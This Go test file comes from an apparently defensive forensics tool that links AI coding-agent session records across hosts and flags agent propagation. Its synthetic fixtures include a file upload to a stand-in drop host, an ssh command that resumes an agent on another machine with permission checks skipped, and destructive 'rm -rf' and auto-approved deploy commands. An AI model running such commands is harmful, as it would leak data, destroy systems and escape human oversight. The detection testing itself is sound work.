package crosscase

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/efij/AgentDFIR/v5/internal/analysis"
	"github.com/efij/AgentDFIR/v5/internal/casepkg"
	"github.com/efij/AgentDFIR/v5/internal/collector"
	"github.com/efij/AgentDFIR/v5/internal/normalize"
	"github.com/efij/AgentDFIR/v5/internal/overlay"
	"github.com/efij/AgentDFIR/v5/internal/products"
	"github.com/efij/AgentDFIR/v5/internal/rulepack"
	"github.com/efij/AgentDFIR/v5/internal/schema"
)

// All identifiers below are synthetic.
const (
	sidS  = "5e551011-0000-4000-8000-00000000000a" // the session continued on another host
	sidP  = "9a7e0000-0000-4000-8000-00000000000b" // the launching session
	sidU  = "0dd00000-0000-4000-8000-00000000000c"
	tcLnk = "toolu_01LaunchAbCdEfGh12"
)

var g0 = time.Date(2026, 10, 2, 13, 0, 0, 0, time.UTC)

func at(min int) string { return g0.Add(time.Duration(min) * time.Minute).Format(time.RFC3339) }

type evOpt func(*schema.Event)

var evSeq int

func gev(sess, typ string, min int, opts ...evOpt) schema.Event {
	evSeq++
	e := schema.Event{EventID: fmt.Sprintf("e%04d", evSeq), SessionID: sess, EventType: typ, Timestamp: at(min), Product: "claude-code",
		SourceArtifact: strings.Repeat("ab", 32), SourcePath: ".claude/projects/p/" + sess + ".jsonl", SourceLine: evSeq, SourceOffset: int64(evSeq * 100),
		Corroboration: schema.StateObserved}
	if typ == schema.EventToolCall {
		e.Action = "shell_execution"
	}
	for _, o := range opts {
		o(&e)
	}
	return e
}

func cmd(c string) evOpt          { return func(e *schema.Event) { e.Command = c } }
func act(a string) evOpt          { return func(e *schema.Event) { e.Action = a } }
func call(id string) evOpt        { return func(e *schema.Event) { e.ToolCallID = id } }
func parentTC(id string) evOpt    { return func(e *schema.Event) { e.ParentToolCallID = id } }
func parentAgent(id string) evOpt { return func(e *schema.Event) { e.ParentAgentID = id } }
func agent(id string) evOpt       { return func(e *schema.Event) { e.AgentID = id } }
func task(id string) evOpt        { return func(e *schema.Event) { e.TaskID = id } }
func env(id string) evOpt         { return func(e *schema.Event) { e.ExecEnv = id } }
func file(p string) evOpt         { return func(e *schema.Event) { e.File = p } }
func dest(d string) evOpt         { return func(e *schema.Event) { e.NetworkDest = d } }
func summary(s string) evOpt      { return func(e *schema.Event) { e.Summary = s } }
func cloud(p, r string) evOpt     { return func(e *schema.Event) { e.Principal, e.ResourceID = p, r } }
func noTime() evOpt               { return func(e *schema.Event) { e.Timestamp = "" } }

func gcase(label, host string, evs ...schema.Event) GraphCase {
	return GraphCase{Label: label, Path: "/cases/" + label + ".adfir", CaseID: "XC-" + label, Host: host, Events: evs}
}

func findings(g *Graph, rule string) []CrossFinding {
	var out []CrossFinding
	for _, f := range g.Findings {
		if f.RuleID == rule {
			out = append(out, f)
		}
	}
	return out
}

func joins(g *Graph, key string) []Edge {
	var out []Edge
	for _, e := range g.Edges {
		if e.JoinKey == key {
			out = append(out, e)
		}
	}
	return out
}

func one(t *testing.T, g *Graph, key, conf string) Edge {
	t.Helper()
	es := joins(g, key)
	if len(es) != 1 {
		t.Fatalf("%s joins: want 1, got %d: %+v", key, len(es), es)
	}
	if es[0].Confidence != conf {
		t.Fatalf("%s join confidence %s (%s), want %s", key, es[0].Confidence, es[0].Reason, conf)
	}
	if len(es[0].Evidence) != 2 || es[0].Evidence[0].Case == es[0].Evidence[1].Case {
		t.Fatalf("%s join must carry evidence from both cases: %+v", key, es[0].Evidence)
	}
	return es[0]
}

func noFindings(t *testing.T, g *Graph) {
	t.Helper()
	if len(g.Findings) != 0 {
		t.Fatalf("unexpected cross-case findings: %+v", g.Findings)
	}
}

// checkGraph asserts structural invariants every graph must hold.
func checkGraph(t *testing.T, g *Graph) {
	t.Helper()
	ids := map[string]bool{}
	for _, n := range g.Nodes {
		ids[n.ID] = true
	}
	for _, e := range g.Edges {
		if !ids[e.From] || !ids[e.To] {
			t.Fatalf("edge points at a missing node: %+v", e)
		}
		if e.Confidence != Strong && e.Confidence != Moderate && e.Confidence != Weak {
			t.Fatalf("bad confidence %+v", e)
		}
		switch e.Time.Relation {
		case RelBefore, RelAfter, RelOverlap, RelUnknown:
		default:
			t.Fatalf("bad time relation %+v", e)
		}
		if e.Reason == "" || len(e.Evidence) == 0 {
			t.Fatalf("edge without reason or evidence: %+v", e)
		}
	}
	for _, f := range g.Findings {
		if len(f.Joins) == 0 || len(f.Limits) == 0 || len(f.EvidenceRefs) == 0 || f.FalsePositive == "" {
			t.Fatalf("finding without joins, limits, evidence or false-positive notes: %+v", f)
		}
		for _, j := range f.Joins {
			if j.Confidence != Strong {
				t.Fatalf("finding justified by a %s join: %+v", j.Confidence, f)
			}
		}
		if f.Status == "" || f.Status == schema.StateUnknown {
			t.Fatalf("finding evidence state not set: %+v", f)
		}
		if !rulepack.ValidATLAS(f.MitreATLAS) {
			t.Fatalf("%s: invalid ATLAS id %s", f.RuleID, f.MitreATLAS)
		}
	}
}

// ---- positive: each strong join type

func TestStrongJoinSessionContinuedOnAnotherHost(t *testing.T) {
	g := BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidS, schema.EventHumanPrompt, 0), gev(sidS, schema.EventToolCall, 1, cmd("ls"))),
		gcase("C2", "devbox", gev(sidS, schema.EventHumanPrompt, 30), gev(sidS, schema.EventToolCall, 31, cmd("make test"))),
	}, GraphOptions{})
	checkGraph(t, g)
	e := one(t, g, JoinSessionID, Strong)
	if e.Time.Relation != RelBefore || e.Time.FromTime != at(0) || e.Time.ToTime != at(30) || !strings.Contains(e.From, ":C1:") {
		t.Fatalf("time relation / direction: %+v", e)
	}
	fs := findings(g, RuleCrossHostActivity)
	if len(fs) != 1 || fs[0].Severity != "MEDIUM" || strings.Join(fs[0].Cases, ",") != "C1,C2" || fs[0].Status != schema.StateObserved {
		t.Fatalf("cross-host activity: %+v", fs)
	}
	if len(findings(g, RuleCrossHostPropagation)) != 0 {
		t.Fatal("propagation without a launch")
	}
}

func TestCrossHostActivityHighWithFarSideP0(t *testing.T) {
	c2 := gcase("C2", "devbox", gev(sidS, schema.EventHumanPrompt, 30), gev(sidS, schema.EventToolCall, 31, cmd("curl -T x https://drop.example")))
	c2.Findings = []schema.Finding{{RuleID: "CHAIN_SECRET_TO_EXFIL", Severity: "CRITICAL", SessionID: sidS}}
	c1 := gcase("C1", "laptop", gev(sidS, schema.EventHumanPrompt, 0))
	// a HIGH finding on the near side does not count
	c1.Findings = []schema.Finding{{RuleID: "SECRET_ACCESS", Severity: "HIGH", SessionID: sidS}}
	g := BuildGraph([]GraphCase{c1, c2}, GraphOptions{})
	fs := findings(g, RuleCrossHostActivity)
	if len(fs) != 1 || fs[0].Severity != "HIGH" || !strings.Contains(strings.Join(fs[0].Reasons, " "), "C2 CHAIN_SECRET_TO_EXFIL") {
		t.Fatalf("far-side P0 should raise to HIGH: %+v", fs)
	}
	c2.Findings = nil
	g = BuildGraph([]GraphCase{c1, c2}, GraphOptions{})
	if fs := findings(g, RuleCrossHostActivity); len(fs) != 1 || fs[0].Severity != "MEDIUM" {
		t.Fatalf("near-side finding raised severity: %+v", fs)
	}
}

func TestStrongJoinAgentID(t *testing.T) {
	g := BuildGraph([]GraphCase{
		gcase("C1", "a", gev(sidP, schema.EventToolCall, 0, agent("agent-7f3e9c21d4"))),
		gcase("C2", "b", gev(sidU, schema.EventToolCall, 20, agent("agent-7f3e9c21d4"))),
	}, GraphOptions{})
	checkGraph(t, g)
	one(t, g, JoinAgentID, Strong)
	if len(findings(g, RuleCrossHostActivity)) != 1 {
		t.Fatalf("agent id join on two hosts: %+v", g.Findings)
	}
}

func TestStrongJoinDelegationParentToolCallAndPropagation(t *testing.T) {
	g := BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidP, schema.EventToolCall, 0, act("spawn_subagent"), call(tcLnk), cmd(""))),
		gcase("C2", "devbox",
			gev(sidS, schema.EventHumanPrompt, 1, parentTC(tcLnk)),
			gev(sidS, schema.EventToolCall, 2, parentTC(tcLnk), cmd("terraform apply -auto-approve"))),
	}, GraphOptions{})
	checkGraph(t, g)
	es := joins(g, JoinDelegation)
	if len(es) == 0 || es[0].Confidence != Strong || !strings.Contains(es[0].From, ":C1:") || !strings.Contains(es[0].To, ":C2:") {
		t.Fatalf("delegation edge: %+v", es)
	}
	ps := findings(g, RuleCrossHostPropagation)
	if len(ps) != 1 || len(ps[0].ChainSteps) != 3 || ps[0].Severity != "HIGH" || ps[0].MitreATTACK != "T1021" {
		t.Fatalf("propagation via delegation: %+v", ps)
	}
	if len(findings(g, RuleCrossHostActivity)) != 1 {
		t.Fatalf("cross-host activity: %+v", g.Findings)
	}
}

func TestStrongJoinParentAgentMatchesTask(t *testing.T) {
	g := BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidP, schema.EventAgentSpawn, 0, task("task-a1b2c3d4e5"))),
		gcase("C2", "devbox", gev(sidS, schema.EventToolCall, 3, parentAgent("task-a1b2c3d4e5"), cmd("ls"))),
	}, GraphOptions{})
	checkGraph(t, g)
	es := joins(g, JoinDelegation)
	if len(es) != 1 || es[0].Confidence != Strong || !strings.Contains(es[0].Reason, "task") {
		t.Fatalf("parent agent → task: %+v", es)
	}
}

func TestStrongJoinToolCallID(t *testing.T) {
	g := BuildGraph([]GraphCase{
		gcase("C1", "gw", gev(sidP, schema.EventToolCall, 0, act("mcp_call"), call("mcpreq-7d1e44a0b9c2"), func(e *schema.Event) { e.MCPServer, e.MCPTool = "files", "write" })),
		gcase("C2", "ws", gev(sidS, schema.EventToolCall, 0, act("mcp_call"), call("mcpreq-7d1e44a0b9c2"), func(e *schema.Event) { e.MCPServer, e.MCPTool = "files", "write" })),
	}, GraphOptions{})
	checkGraph(t, g)
	e := one(t, g, JoinToolCallID, Strong)
	if g.Summary.Nodes[NodeMCPTool] != 2 {
		t.Fatalf("MCP tool context nodes: %+v", g.Summary)
	}
	_ = e
	// short or numeric ids (JSON-RPC 1, 2, 3 …) are not joins
	g = BuildGraph([]GraphCase{
		gcase("C1", "gw", gev(sidP, schema.EventToolCall, 0, call("7"))),
		gcase("C2", "ws", gev(sidU, schema.EventToolCall, 0, call("7"))),
	}, GraphOptions{})
	if len(joins(g, JoinToolCallID)) != 0 {
		t.Fatal("a short tool call id joined two cases")
	}
}

func TestStrongJoinGitCommit(t *testing.T) {
	full := "4f1c2e9a7b3d5e6f8091a2b3c4d5e6f708192a3b"
	g := BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidP, schema.EventToolResult, 0, summary("[main "+full+"] add helper"))),
		gcase("C2", "ci", gev(sidS, schema.EventToolCall, 10, cmd("git fetch origin && git checkout "+full))),
	}, GraphOptions{})
	checkGraph(t, g)
	e := one(t, g, JoinCommit, Strong)
	if e.Time.Relation != RelBefore {
		t.Fatalf("commit join time: %+v", e)
	}
	// abbreviated ids collide: weak only, no finding
	g = BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidP, schema.EventToolResult, 0, summary("[main 4f1c2e9] add helper"))),
		gcase("C2", "ci", gev(sidS, schema.EventToolCall, 10, cmd("git checkout 4f1c2e9"))),
	}, GraphOptions{})
	one(t, g, JoinCommitAbbrev, Weak)
	noFindings(t, g)
}

func TestStrongJoinFileHash(t *testing.T) {
	h := strings.Repeat("c0ffee12", 8)
	c1, c2 := gcase("C1", "a"), gcase("C2", "b")
	c1.Files = []FileHash{{SHA256: h, Path: "home/.claude/agents/helper.md", Size: 900}, {SHA256: strings.Repeat("0", 64), Path: "empty", Size: 0}}
	c2.Files = []FileHash{{SHA256: h, Path: "home/dev/.claude/agents/helper.md", Size: 900}, {SHA256: strings.Repeat("0", 64), Path: "empty", Size: 0}}
	g := BuildGraph([]GraphCase{c1, c2}, GraphOptions{})
	checkGraph(t, g)
	e := one(t, g, JoinFileHash, Strong)
	if e.Evidence[0].ArtifactID != h || e.Evidence[1].Path != "home/dev/.claude/agents/helper.md" {
		t.Fatalf("file evidence: %+v", e.Evidence)
	}
	noFindings(t, g) // shared content is not agent activity
}

func TestCloudPrincipalResourceAndModerateJoins(t *testing.T) {
	role := "arn:aws:iam::111122223333:role/deploy"
	g := BuildGraph([]GraphCase{
		gcase("C1", "a", gev(sidP, schema.EventToolCall, 0, cloud(role, "arn:aws:s3:::prod-backups"), env("ctr-9f8e7d"))),
		gcase("C2", "b", gev(sidS, schema.EventToolCall, 5, cloud(role, "arn:aws:s3:::prod-backups"), env("ctr-9f8e7d"))),
	}, GraphOptions{})
	checkGraph(t, g)
	one(t, g, JoinPrincipalResource, Strong)
	if len(joins(g, JoinPrincipal)) != 0 {
		t.Fatal("principal-only join added on top of the pair")
	}
	one(t, g, JoinExecEnv, Moderate)
	noFindings(t, g)
	g = BuildGraph([]GraphCase{
		gcase("C1", "a", gev(sidP, schema.EventToolCall, 0, cloud(role, "arn:aws:s3:::one"))),
		gcase("C2", "b", gev(sidS, schema.EventToolCall, 5, cloud(role, "arn:aws:s3:::two"))),
	}, GraphOptions{})
	one(t, g, JoinPrincipal, Moderate)
	noFindings(t, g)
}

func TestPropagationRemoteLaunchNamedSession(t *testing.T) {
	g := BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidP, schema.EventHumanPrompt, 0),
			gev(sidP, schema.EventToolCall, 5, call("toolu_01SshLaunchXyZ987"), cmd(`ssh -i ~/.ssh/k dev@devbox.internal "claude --resume `+sidS+` -p 'carry on' --dangerously-skip-permissions"`))),
		gcase("C2", "devbox", gev(sidS, schema.EventHumanPrompt, 6), gev(sidS, schema.EventToolCall, 7, cmd("rm -rf /srv/app/releases"))),
	}, GraphOptions{})
	checkGraph(t, g)
	e := one(t, g, JoinSessionInCommand, Strong)
	if !strings.Contains(e.Reason, "devbox.internal") || e.Time.Relation != RelBefore {
		t.Fatalf("launch edge: %+v", e)
	}
	ps := findings(g, RuleCrossHostPropagation)
	if len(ps) != 1 {
		t.Fatalf("propagation: %+v", g.Findings)
	}
	p := ps[0]
	if p.ChainSteps[0].Timestamp != at(5) || p.ChainSteps[1].Timestamp != at(6) || p.ChainSteps[2].Timestamp != at(7) ||
		!strings.HasPrefix(p.ChainSteps[0].Evidence, "C1: ") || !strings.HasPrefix(p.ChainSteps[2].Evidence, "C2: ") {
		t.Fatalf("propagation steps: %+v", p.ChainSteps)
	}
	if p.Joins[0].JoinKey != JoinSessionInCommand || p.Confidence != "HIGH" || p.Status != schema.StateObserved {
		t.Fatalf("propagation joins/confidence/state: %+v", p)
	}
	// outside the window: the action two hours later does not complete it
	g = BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidP, schema.EventToolCall, 5, cmd(`ssh devbox "claude --resume `+sidS+` -p go"`))),
		gcase("C2", "devbox", gev(sidS, schema.EventHumanPrompt, 125), gev(sidS, schema.EventToolCall, 126, cmd("rm -rf /srv"))),
	}, GraphOptions{})
	if len(findings(g, RuleCrossHostPropagation)) != 0 {
		t.Fatalf("expired window completed the chain: %+v", g.Findings)
	}
	// a denied action is not consequential
	g = BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidP, schema.EventToolCall, 5, cmd(`ssh devbox "claude --resume `+sidS+` -p go"`))),
		gcase("C2", "devbox", gev(sidS, schema.EventHumanPrompt, 6), gev(sidS, schema.EventToolCall, 7, cmd("rm -rf /srv"), func(e *schema.Event) { e.ResultStatus = "denied" })),
	}, GraphOptions{})
	if len(findings(g, RuleCrossHostPropagation)) != 0 {
		t.Fatalf("denied action completed the chain: %+v", g.Findings)
	}
}

// ---- negative

func TestWeakJoinsNeverRaiseFindings(t *testing.T) {
	prompt := "please refactor the payment reconciliation module and add tests for currency rounding"
	g := BuildGraph([]GraphCase{
		gcase("C1", "laptop",
			gev(sidP, schema.EventHumanPrompt, 0, summary(prompt)),
			gev(sidP, schema.EventToolCall, 1, cmd("curl -s http://203.0.113.50/x"), dest("203.0.113.50")),
			gev(sidP, schema.EventToolCall, 2, act("write_file"), file("/home/a/src/payments.py"))),
		gcase("C2", "devbox",
			gev(sidU, schema.EventHumanPrompt, 3, summary(prompt+" please")),
			gev(sidU, schema.EventToolCall, 4, cmd("curl -s http://203.0.113.50/y"), dest("203.0.113.50")),
			gev(sidU, schema.EventToolCall, 5, act("write_file"), file(`C:\work\src\payments.py`))),
	}, GraphOptions{})
	checkGraph(t, g)
	one(t, g, JoinDestination, Weak)
	one(t, g, JoinFilename, Weak)
	one(t, g, JoinPrompt, Weak)
	for _, e := range g.Edges {
		if e.JoinKey != "" && e.Confidence != Weak {
			t.Fatalf("non-weak join from weak evidence: %+v", e)
		}
	}
	noFindings(t, g)
	out, _ := json.Marshal(g)
	if bytes.Contains(out, []byte("reconciliation")) {
		t.Fatal("prompt text copied into the graph")
	}
	// each weak join alone, too
	for _, pair := range [][2]schema.Event{
		{gev(sidP, schema.EventToolCall, 1, dest("203.0.113.50")), gev(sidU, schema.EventToolCall, 2, dest("203.0.113.50"))},
		{gev(sidP, schema.EventToolCall, 1, file("/a/notes.txt")), gev(sidU, schema.EventToolCall, 2, file("/b/notes.txt"))},
		{gev(sidP, schema.EventHumanPrompt, 1, summary(prompt)), gev(sidU, schema.EventHumanPrompt, 2, summary(prompt))},
	} {
		noFindings(t, BuildGraph([]GraphCase{gcase("C1", "a", pair[0]), gcase("C2", "b", pair[1])}, GraphOptions{}))
	}
}

func TestContradictedTimestampsDowngradeAndNoPropagation(t *testing.T) {
	// C1 creates session P at 15:00 and launches session S on devbox at
	// 15:05, but every record of S in C2 is from 13:00–13:10.
	g := BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidP, schema.EventHumanPrompt, 120), gev(sidS, schema.EventHumanPrompt, 121),
			gev(sidP, schema.EventToolCall, 125, cmd(`ssh devbox "claude --resume `+sidS+` -p go"`))),
		gcase("C2", "devbox", gev(sidS, schema.EventHumanPrompt, 0), gev(sidS, schema.EventToolCall, 10, cmd("rm -rf /srv"))),
	}, GraphOptions{})
	checkGraph(t, g)
	l := one(t, g, JoinSessionInCommand, Moderate)
	if l.Time.Relation != RelAfter || !strings.Contains(l.Reason, "contradict") {
		t.Fatalf("launch edge should be marked after/contradicted: %+v", l)
	}
	s := one(t, g, JoinSessionID, Moderate)
	if !strings.Contains(s.Reason, "contradict") || !strings.Contains(s.From, ":C1:") {
		t.Fatalf("session edge should be downgraded and oriented by the launch: %+v", s)
	}
	noFindings(t, g)
}

func TestUnrelatedAndSamePlaceAndOverlap(t *testing.T) {
	// unrelated sessions: nothing joins
	g := BuildGraph([]GraphCase{
		gcase("C1", "a", gev(sidP, schema.EventToolCall, 0, cmd("ls"), call("toolu_01AAAAAAAAAAAAAAAA"))),
		gcase("C2", "b", gev(sidU, schema.EventToolCall, 0, cmd("ls"), call("toolu_01BBBBBBBBBBBBBBBB"))),
	}, GraphOptions{})
	checkGraph(t, g)
	for _, e := range g.Edges {
		if e.JoinKey != "" {
			t.Fatalf("unrelated sessions joined: %+v", e)
		}
	}
	noFindings(t, g)
	// the same session id from two collections of one machine: joined, not cross-host
	g = BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidS, schema.EventHumanPrompt, 0)),
		gcase("C2", "LAPTOP", gev(sidS, schema.EventHumanPrompt, 30)),
	}, GraphOptions{})
	if e := one(t, g, JoinSessionID, Strong); !strings.Contains(e.Reason, "two collections of one machine") {
		t.Fatalf("same-host note missing: %+v", e)
	}
	noFindings(t, g)
	// overlapping recordings of one session on two hosts: copies, downgraded
	g = BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidS, schema.EventHumanPrompt, 0), gev(sidS, schema.EventToolCall, 20, cmd("ls"))),
		gcase("C2", "devbox", gev(sidS, schema.EventHumanPrompt, 5), gev(sidS, schema.EventToolCall, 25, cmd("ls"))),
	}, GraphOptions{})
	if e := one(t, g, JoinSessionID, Moderate); e.Time.Relation != RelOverlap {
		t.Fatalf("overlap: %+v", e)
	}
	noFindings(t, g)
	// a remote launch no identifier ties to the later session: weak, no finding
	g = BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidP, schema.EventToolCall, 0, cmd(`ssh devbox "claude -p 'clean up'"`))),
		gcase("C2", "devbox", gev(sidU, schema.EventHumanPrompt, 1), gev(sidU, schema.EventToolCall, 2, cmd("rm -rf /tmp/x"))),
	}, GraphOptions{})
	one(t, g, JoinLaunchTiming, Weak)
	noFindings(t, g)
	// short session ids collide and are not joined
	g = BuildGraph([]GraphCase{gcase("C1", "a", gev("s1", schema.EventHumanPrompt, 0)), gcase("C2", "b", gev("s1", schema.EventHumanPrompt, 9))}, GraphOptions{})
	if len(joins(g, JoinSessionID)) != 0 {
		t.Fatal("short session id joined")
	}
}

func TestHostileContentBounded(t *testing.T) {
	var c1, c2 []schema.Event
	huge := strings.Repeat("Z", 10000)
	for i := 0; i < 3000; i++ {
		s := fmt.Sprintf("sess-%06d-aaaaaaaa", i)
		c1 = append(c1, gev(s, schema.EventToolCall, i%50, call(fmt.Sprintf("toolu_%016d", i)), cmd(strings.Repeat("ssh x claude ", 2000))))
		c2 = append(c2, gev(s, schema.EventToolCall, 60+i%50, call(fmt.Sprintf("toolu_%016d", i))))
	}
	c1 = append(c1,
		gev(huge, schema.EventToolCall, 1, agent(huge), call(huge), parentTC(huge), env(huge), cloud(huge, huge)),
		gev("bad\x00id\x1b[31m-aaaaaaaa", schema.EventHumanPrompt, 1, parentAgent("evil\nagent-aaaaaaaa")),
		gev(sidS, schema.EventToolCall, 1, noTime(), summary(strings.Repeat("[main ", 5000))),
		schema.Event{}, // empty record
	)
	c2 = append(c2, gev("bad\x00id\x1b[31m-aaaaaaaa", schema.EventHumanPrompt, 2), gev(huge, schema.EventToolCall, 2, agent(huge)), schema.Event{})
	g := BuildGraph([]GraphCase{gcase("C1", "a", c1...), gcase("C2", "b", c2...)}, GraphOptions{MaxNodes: 60, MaxEdges: 80, MaxPerJoin: 100, MaxKeys: 1000})
	checkGraph(t, g)
	if !g.Truncated || len(g.Nodes) > 60 || len(g.Edges) > 80 || g.Omitted["identifiers_over_bound"] == 0 || g.Omitted["unusable_identifiers"] == 0 {
		t.Fatalf("bounds not applied: truncated=%v nodes=%d edges=%d omitted=%v", g.Truncated, len(g.Nodes), len(g.Edges), g.Omitted)
	}
	out, _ := json.Marshal(g)
	if bytes.Contains(out, []byte(huge)) || bytes.Contains(out, []byte("\\u001b")) {
		t.Fatal("oversized or control-character identifiers reached the output")
	}
	var txt bytes.Buffer
	WriteGraphText(&txt, g)
	if strings.Contains(txt.String(), "\x1b") {
		t.Fatal("control characters in text output")
	}
	// no input at all
	_ = BuildGraph(nil, GraphOptions{})
	_ = BuildGraph([]GraphCase{gcase("C1", ""), gcase("C1", "")}, GraphOptions{})
}

func TestSecretsMaskedInGraph(t *testing.T) {
	role := "svc-" + sharedToken
	g := BuildGraph([]GraphCase{
		gcase("C1", "a", gev(sidP, schema.EventToolCall, 0, cloud(role, "bucket-1"))),
		gcase("C2", "b", gev(sidS, schema.EventToolCall, 5, cloud(role, "bucket-1"))),
	}, GraphOptions{})
	one(t, g, JoinPrincipalResource, Strong)
	out, _ := json.Marshal(g)
	if bytes.Contains(out, []byte(sharedToken[4:])) {
		t.Fatal("credential leaked into the graph")
	}
}

func TestGraphDeterministic(t *testing.T) {
	mk := func() []GraphCase {
		evSeq = 0
		return []GraphCase{
			gcase("C1", "laptop", gev(sidP, schema.EventHumanPrompt, 0), gev(sidS, schema.EventHumanPrompt, 1),
				gev(sidP, schema.EventToolCall, 5, call(tcLnk), cmd(`ssh devbox "claude --resume `+sidS+` -p go"`)),
				gev(sidP, schema.EventToolCall, 6, dest("203.0.113.9"), file("/x/a.txt"))),
			gcase("C2", "devbox", gev(sidS, schema.EventHumanPrompt, 6, parentTC(tcLnk)), gev(sidS, schema.EventToolCall, 7, cmd("rm -rf /srv")),
				gev(sidU, schema.EventToolCall, 8, dest("203.0.113.9"), file("/y/a.txt"))),
			gcase("C3", "ci", gev(sidS, schema.EventHumanPrompt, 50), gev(sidU, schema.EventToolCall, 9, dest("203.0.113.9"))),
		}
	}
	a, _ := json.Marshal(BuildGraph(mk(), GraphOptions{}))
	for i := 0; i < 5; i++ {
		b, _ := json.Marshal(BuildGraph(mk(), GraphOptions{}))
		if !bytes.Equal(a, b) {
			t.Fatal("graph output is not deterministic")
		}
	}
	var g Graph
	_ = json.Unmarshal(a, &g)
	checkGraph(t, &g)
	for i := 1; i < len(g.Nodes); i++ {
		p, c := g.Nodes[i-1], g.Nodes[i]
		if nodeRank[p.Kind] > nodeRank[c.Kind] || nodeRank[p.Kind] == nodeRank[c.Kind] && p.ID >= c.ID {
			t.Fatalf("nodes not sorted at %d: %s, %s", i, p.ID, c.ID)
		}
	}
}

// ---- sealed packages through Run

// sealedCase collects a Claude Code profile holding the given transcripts
// into a sealed, analyzed package, then stamps the v5 evidence fields the
// parsers fill (exec env …) onto its events, as an updated parser would.
func sealedCase(t *testing.T, caseID string, files map[string]string, stamp func(*schema.Event)) string {
	t.Helper()
	root := filepath.Join(t.TempDir(), "home")
	files[".agentdfir-simulated"] = "synthetic\n"
	files[".claude.json"] = `{"numStartups":1}` + "\n"
	for rel, content := range files {
		full := filepath.Join(root, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	pkg := filepath.Join(t.TempDir(), "case.adfir")
	b, err := casepkg.New(pkg, caseID, casepkg.CaseInfo{OperatorOSUser: "tester"})
	if err != nil {
		t.Fatal(err)
	}
	man, err := products.ManifestAllPlatforms("claude-code")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := collector.Run(b, man, collector.Options{ProfileRoot: root, ConfigRoot: filepath.Join(root, ".claude"), SystemRoot: root, Product: "claude-code"}); err != nil {
		t.Fatal(err)
	}
	if err := b.Seal(); err != nil {
		t.Fatal(err)
	}
	b.Close()
	if _, err := analysis.Run(pkg, analysis.Options{}); err != nil {
		t.Fatal(err)
	}
	if stamp != nil {
		evs := analysis.LoadEvents(pkg)
		for i := range evs {
			stamp(&evs[i])
		}
		if err := overlay.WriteJSONLPlain(filepath.Join(pkg, "normalized", "events.jsonl"), len(evs), func(i int) any { return evs[i] }); err != nil {
			t.Fatal(err)
		}
		// Record the stamped overlay the way an annotating stage does, so
		// it is not treated as changed outside AgentDFIR and rebuilt.
		if err := normalize.RecordEvents(pkg); err != nil {
			t.Fatal(err)
		}
	}
	return pkg
}

func transcript(sid string, t0 time.Time, cmds ...string) string {
	ts := func(s int) string { return t0.Add(time.Duration(s) * time.Second).Format(time.RFC3339) }
	lines := []string{js(map[string]any{"type": "user", "uuid": "u0", "sessionId": sid, "timestamp": ts(0), "version": "2.1.0",
		"message": map[string]any{"role": "user", "content": "continue the work"}})}
	parent := "u0"
	for i, c := range cmds {
		id := fmt.Sprintf("toolu_%s_%02d", sid[:8], i)
		a, r := fmt.Sprintf("a%d", i), fmt.Sprintf("r%d", i)
		lines = append(lines,
			js(map[string]any{"type": "assistant", "uuid": a, "parentUuid": parent, "sessionId": sid, "timestamp": ts(10 + 20*i), "version": "2.1.0",
				"message": map[string]any{"role": "assistant", "model": "m", "content": []any{map[string]any{"type": "tool_use", "id": id, "name": "Bash", "input": map[string]any{"command": c}}}}}),
			js(map[string]any{"type": "user", "uuid": r, "parentUuid": a, "sessionId": sid, "timestamp": ts(12 + 20*i), "version": "2.1.0",
				"message": map[string]any{"role": "user", "content": []any{map[string]any{"type": "tool_result", "tool_use_id": id, "content": "ok"}}}}))
		parent = r
	}
	return strings.Join(lines, "\n") + "\n"
}

func TestRunGraphSealedPackages(t *testing.T) {
	setup(t)
	a := sealedCase(t, "XG-LAPTOP", map[string]string{
		".claude/projects/-w-app/" + sidP + ".jsonl": transcript(sidP, g0, `ssh dev@devbox "claude --resume `+sidS+` -p 'finish the deploy'"`),
	}, func(e *schema.Event) { e.ExecEnv = "laptop-01" })
	b := sealedCase(t, "XG-DEVBOX", map[string]string{
		".claude/projects/-srv-app/" + sidS + ".jsonl": transcript(sidS, g0.Add(time.Minute), "rm -rf /srv/app/releases/old"),
	}, func(e *schema.Event) { e.ExecEnv = "devbox-ctr-7" })
	// without --graph the report is unchanged: no graph member
	rep, err := Run([]string{a, b}, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if out, _ := json.Marshal(rep); rep.Graph != nil || bytes.Contains(out, []byte(`"graph"`)) {
		t.Fatal("graph emitted without --graph")
	}
	rep, err = Run([]string{a, b}, Options{Graph: true})
	if err != nil {
		t.Fatal(err)
	}
	g := rep.Graph
	if g == nil || g.Schema != GraphSchema || g.Unverified || len(g.Cases) != 2 {
		t.Fatalf("graph: %+v", g)
	}
	checkGraph(t, g)
	one(t, g, JoinSessionInCommand, Strong)
	ps := findings(g, RuleCrossHostPropagation)
	if len(ps) != 1 || !strings.Contains(ps[0].ChainSteps[0].Evidence, sidP+".jsonl") || !strings.Contains(ps[0].ChainSteps[2].Evidence, sidS+".jsonl") {
		t.Fatalf("propagation from sealed evidence: %+v", g.Findings)
	}
	var txt bytes.Buffer
	WriteGraphText(&txt, g)
	for _, want := range []string{"ACTIVITY GRAPH", "[STRONG] session_id_in_command", RuleCrossHostPropagation, "limit:"} {
		if !strings.Contains(txt.String(), want) {
			t.Fatalf("text output lacks %q:\n%s", want, txt.String())
		}
	}
	// deterministic through Run
	rep2, _ := Run([]string{a, b}, Options{Graph: true})
	x, _ := json.Marshal(rep.Graph)
	y, _ := json.Marshal(rep2.Graph)
	if !bytes.Equal(x, y) {
		t.Fatal("Run graph not deterministic")
	}

	// integrity: a failing seal is refused; with --allow-unverified the
